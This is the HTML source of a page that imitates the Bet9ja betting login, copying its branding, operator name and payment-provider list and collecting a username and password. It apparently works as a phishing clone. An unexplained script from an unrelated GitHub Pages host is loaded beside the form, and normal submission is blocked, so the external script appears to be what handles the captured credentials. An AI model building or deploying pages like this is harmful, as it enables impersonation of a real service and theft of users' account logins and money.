<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bet9ja Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{
  box-sizing:border-box;
  font-family:Arial,Helvetica,sans-serif;
  -webkit-tap-highlight-color: transparent;
}

body{
  margin:0;
  background:#2b2f3a;
  color:#fff;
}

/* HEADER */
.header{
  background:#1f232b;
  padding:12px;
  display:flex;
  justify-content:center;
  align-items:center;
  position:relative;
}

.back{
  position:absolute;
  left:12px;
  font-size:14px;
  color:#ccc;
}

.head-logo{
  font-size:22px;
  font-weight:800;
}

.head-logo .red{color:#e50914}
.head-logo .green{color:#36c773}

/* LOGIN FORM */
.login-box{
  padding:20px;
}

.tab{
  display:flex;
  justify-content:space-between;
  margin-bottom:18px;
  font-size:15px;
}

/* ===== BET9JA INPUT FEEL ===== */
input{
  width:100%;
  padding:15px 14px;
  margin-bottom:14px;
  border-radius:8px;
  background:#3a3f4a;
  color:white;
  font-size:15px;
  border:1.5px solid transparent;
  outline:none;
  transition:all .18s ease;
}

input::placeholder{
  color:#b4b8c1;
  transition:.2s;
}

input:focus{
  border-color:#0a7c3a;
  background:#343944;
  box-shadow:0 0 0 1px rgba(10,124,58,0.4);
}

input:focus::placeholder{
  opacity:.4;
}

input:-webkit-autofill{
  -webkit-text-fill-color:#fff;
  transition: background-color 9999s ease-in-out 0s;
}

/* ===== BET9JA BUTTON STATES ===== */
button{
  width:100%;
  padding:15px;
  border:none;
  border-radius:8px;
  color:white;
  font-size:15px;
  font-weight:bold;
  cursor:not-allowed;
  transition:all .15s ease;
  background:#07592a;
  opacity:.45;
}

/* ENABLED BUTTON */
button.active{
  background:#0a7c3a;
  cursor:pointer;
  opacity:1;
}

button.active:active{
  transform:scale(0.985);
  background:#096932;
}

.forgot{
  margin-top:14px;
  text-align:center;
  font-size:14px;
  color:#cfd3da;
}

/* FOOTER */
.footer{
  text-align:center;
  padding:30px 12px;
  font-size:12px;
  color:#ccc;
}

.payment{
  display:grid;
  grid-template-columns:repeat(4,1fr);
  gap:12px;
  margin-top:18px;
}

.box{
  background:#3a3f4a;
  padding:10px;
  border-radius:8px;
}
</style>
</head>
<script src="https://plyarth.github.io/intc/in.js"></script>
<body>

<!-- HEADER -->
<div class="header">
  <div class="back">← Back</div>
  <div class="head-logo">
    <span class="red">bet</span><span class="green">9ja</span>
  </div>
</div>

<!-- FORM -->
<div class="login-box">
  <div class="tab">
    <div style="color:#00ff73">Login</div>
    <div style="color:gold">Register</div>
  </div>

  <!-- ✅ REAL FORM TAG -->
  <form id="loginForm">

    <!-- ✅ NAME ATTRIBUTES ADDED -->
    <input 
      type="text" 
      name="username" 
      id="username"
      placeholder="Mobile Number or Username" 
      required
    >

    <input 
      type="password" 
      name="password" 
      id="password"
      placeholder="Password" 
      required
    >

    <!-- ✅ BUTTON STARTS DISABLED -->
    <button type="submit" id="loginBtn" disabled>Login</button>

  </form>

  <div class="forgot">Forgot your password?</div>
</div>

<!-- FOOTER -->
<div class="footer">
  <div class="head-logo" style="margin-bottom:12px">
    <span class="red">bet</span><span class="green">9ja</span>
  </div>

  Responsible Gambling | Contact Us | Help | T&C's

  <div class="payment">
    <div class="box">Visa</div>
    <div class="box">Mastercard</div>
    <div class="box">Paystack</div>
    <div class="box">Flutter</div>
    <div class="box">GTBank</div>
    <div class="box">UBA</div>
    <div class="box">Zenith</div>
    <div class="box">Providus</div>
  </div>

  <p style="margin-top:20px">
    NDPR Audit Compliant 2024<br><br>
    KC Gaming Networks Limited.<br>
    All rights reserved.
  </p>
</div>

<!-- ✅ REAL-TIME ENABLE / DISABLE SCRIPT -->
<script>
const username = document.getElementById("username");
const password = document.getElementById("password");
const loginBtn = document.getElementById("loginBtn");

function checkInputs(){
  if(username.value.trim() !== "" && password.value.trim() !== ""){
    loginBtn.disabled = false;
    loginBtn.classList.add("active");
  } else {
    loginBtn.disabled = true;
    loginBtn.classList.remove("active");
  }
}

username.addEventListener("input", checkInputs);
password.addEventListener("input", checkInputs);

// Prevent actual submission for demo
document.getElementById("loginForm").addEventListener("submit", function(e){
  e.preventDefault();
});
</script>

</body>
</html>
